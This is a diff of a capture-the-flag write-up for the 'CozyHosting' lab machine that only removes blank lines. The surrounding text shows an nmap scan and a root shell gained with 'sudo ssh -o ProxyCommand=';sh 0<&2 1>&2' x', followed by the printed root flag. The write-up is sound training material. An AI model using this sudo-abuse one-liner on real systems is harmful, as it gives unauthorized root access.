@@ -20,7 +20,6 @@ CozyHosting is an easy-difficulty Linux machine that features a `Spring Boot` ap
 ## Nmap
 
 ```bash
-
 # Nmap 7.94 scan initiated Sun Sep  3 19:38:53 2023 as: nmap -sVC -T4 -Pn -vv -oA ./nmap/full_tcp_scan -p 22,80 cozyhosting.htb
 Nmap scan report for cozyhosting.htb (10.129.67.19)
 Host is up, received user-set (0.11s latency).
@@ -43,7 +42,6 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-
 # Nmap done at Sun Sep  3 19:39:05 2023 -- 1 IP address (1 host up) scanned in 12.32 seconds
 ```
 
@@ -480,10 +478,8 @@ User josh may run the following commands on localhost:
 
 ```bash
 josh@cozyhosting:~$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-
 # id
 uid=0(root) gid=0(root) groups=0(root)
-
 # cat /root/root.txt
 b072647f1011c4752e2a7ec4d7327da6
 ```
